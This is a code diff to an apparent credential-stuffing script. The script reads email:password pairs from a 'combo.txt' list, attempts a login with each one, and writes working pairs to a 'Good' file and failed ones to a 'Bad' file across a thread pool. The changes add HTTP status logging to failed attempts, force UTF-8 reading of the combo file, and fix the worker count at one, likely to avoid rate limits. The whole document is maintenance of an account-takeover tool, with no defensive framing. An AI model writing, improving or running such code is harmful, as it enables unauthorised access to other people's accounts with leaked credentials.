@@ -21,6 +21,7 @@ class colors:
 def Login(credential):
     try:
         is_bad=False
+        status=0
         credential=credential
         Email=credential.split(":")[0]
         Pass=credential.split(":")[1]
@@ -59,6 +60,7 @@ def Login(credential):
             Good.write(f"{credential}\n")
             Good.flush()
         else:
+            status=response.status_code
             is_bad=True
     except requests.exceptions.Timeout:
         print(f"{colors.LBLUE}=>  TimeOut : {credential} {e} {colors.RESET} ")
@@ -72,17 +74,16 @@ def Login(credential):
 
     finally:
         if is_bad == True:
-            print(f"{colors.GREY}=> {colors.RESET} {colors.LRED} Failed : {credential} {colors.RESET} ")
+            print(f"{colors.GREY}=> {colors.RESET} {colors.LRED} Failed : {credential}----->{status} {colors.RESET} ")
             Bad.write(credential+"\n")
             Bad.flush()  
 
 def main():
     ip_file = "combo.txt"
-    with open(ip_file, "r") as combo1:
+    with open(ip_file, "r", encoding="UTF-8") as combo1:
         combo= combo1.readlines()
-    Worker= input("How many threads do you want ? ")
     with concurrent.futures.ThreadPoolExecutor(
-        max_workers=int(Worker)) as executor:  #Adjust max_workers as needed
+        max_workers=1) as executor:  #Adjust max_workers as needed
         executor.map(Login,combo)
 
 
